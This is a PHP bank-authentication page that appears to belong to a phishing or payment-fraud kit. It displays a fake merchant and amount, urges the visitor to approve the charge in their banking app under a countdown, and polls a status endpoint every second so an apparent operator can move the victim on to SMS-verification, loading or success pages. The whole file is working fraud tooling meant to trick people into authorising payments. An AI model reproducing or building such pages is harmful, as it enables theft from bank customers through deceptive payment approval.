<?php
session_start();

// Load config file
$config = require __DIR__ . '/config.php';
require_once 'functions.php';

// Get store ID from session
$storeId = $_SESSION['current_store_id'] ?? null;

// Load specific store configuration if available
if ($storeId && isset($config['generated_links'][$storeId])) {
    $storeConfig = $config['generated_links'][$storeId];
    $config['store'] = $storeConfig['store'];
    $config['product'] = $storeConfig['product'];
} else {
    // Set default values if config keys are missing
    if (!isset($config['store'])) {
        $config['store'] = array();
    }
    if (!isset($config['product'])) {
        $config['product'] = array();
    }

    // Set default values for required fields
    $config['store'] = array_merge([
        'name' => 'Store Name',
        'currency' => 'USD',
        'theme_color' => '#FFBABA'
    ], $config['store']);

    $config['product'] = array_merge([
        'name' => 'Product Name',
        'price' => 0.00,
        'size' => '',
        'shipping' => array(
            'method' => 'Standard Shipping',
            'price' => 'FREE'
        )
    ], $config['product']);
}

$sessionId = $_SESSION['unique_id'] ?? '(not set)';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Authentication</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full text-center">
        <!-- Loading Animation -->
        <div class="mb-8">
            <div class="w-20 h-20 bg-[<?php echo $config['store']['theme_color']; ?>]/10 rounded-full flex items-center justify-center mx-auto relative">
                <div class="w-16 h-16 border-4 border-[<?php echo $config['store']['theme_color']; ?>] border-t-transparent rounded-full animate-spin"></div>
                <svg class="w-8 h-8 text-[<?php echo $config['store']['theme_color']; ?>] absolute" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                </svg>
            </div>
        </div>

        <!-- Transaction Details -->
        <div class="bg-gray-50 rounded-lg p-4 mb-8">
            <div class="flex justify-between mb-3">
                <span class="text-gray-600">Amount:</span>
                <span class="font-semibold"><?php echo formatPrice($config['product']['price']); ?></span>
            </div>
            <div class="flex justify-between mb-3">
                <span class="text-gray-600">Merchant:</span>
                <span class="font-semibold"><?php echo htmlspecialchars($config['store']['name']); ?></span>
            </div>
            <div class="flex justify-between">
                <span class="text-gray-600">Date:</span>
                <span class="font-semibold"><?php echo date('d M Y H:i'); ?></span>
            </div>
        </div>

        <!-- Instructions Card -->
        <div class="border border-[<?php echo $config['store']['theme_color']; ?>] rounded-lg bg-[<?php echo $config['store']['theme_color']; ?>]/10 p-6 mb-8">
            <h2 class="font-semibold text-gray-900 mb-4 flex items-center">
                <svg class="w-5 h-5 mr-2 text-[<?php echo $config['store']['theme_color']; ?>]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                Instructions
            </h2>
            <ol class="text-left text-gray-700 space-y-2">
                <li>1. Open your banking app</li>
                <li>2. Check for a new authorization request</li>
                <li>3. Verify the amount: <?php echo formatPrice($config['product']['price']); ?></li>
                <li>4. Approve the transaction</li>
            </ol>
        </div>

        <!-- Timer -->
        <div class="text-gray-600 mb-4">
            Time remaining: <span id="timer" class="font-medium text-[<?php echo $config['store']['theme_color']; ?>]">05:00</span>
        </div>

        <!-- Security Notice -->
        <div class="flex items-center justify-center text-gray-500 text-sm">
            <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
            </svg>
            Secured by bank
        </div>
    </div>

    <script>
        const sessionId = '<?php echo $sessionId; ?>';
        const storeId = '<?php echo $storeId ?? ''; ?>';
        const storeParam = storeId ? `?store=${encodeURIComponent(storeId)}` : '';
        
        function checkStatus() {
            fetch(`/check_status.php?session=${sessionId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status && data.status !== 'bank') {
                        switch(data.status) {
                            case 'success':
                                window.location.replace('/success.php' + storeParam);
                                break;
                            case 'sms':
                                window.location.replace('/sms_verification.php' + storeParam);
                                break;
                            case 'loading':
                                window.location.replace('/loading.php' + storeParam);
                                break;
                            case 'declined':
                                window.location.replace('/index.php' + storeParam + '&error=payment_declined');
                                break;
                        }
                    }
                })
                .catch(error => console.error('Error checking status:', error));
        }

        // Countdown timer
        let timeLeft = 300; // 5 minutes in seconds
        const timerElement = document.getElementById('timer');

        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            
            if (timeLeft === 0) {
                window.location.replace('/loading.php');
            } else {
                timeLeft--;
                setTimeout(updateTimer, 1000);
            }
        }

        // Check status every second
        const checkInterval = setInterval(checkStatus, 1000);
        // Also check immediately
        checkStatus();
        // Start timer
        updateTimer();
    </script>
</body>
</html> 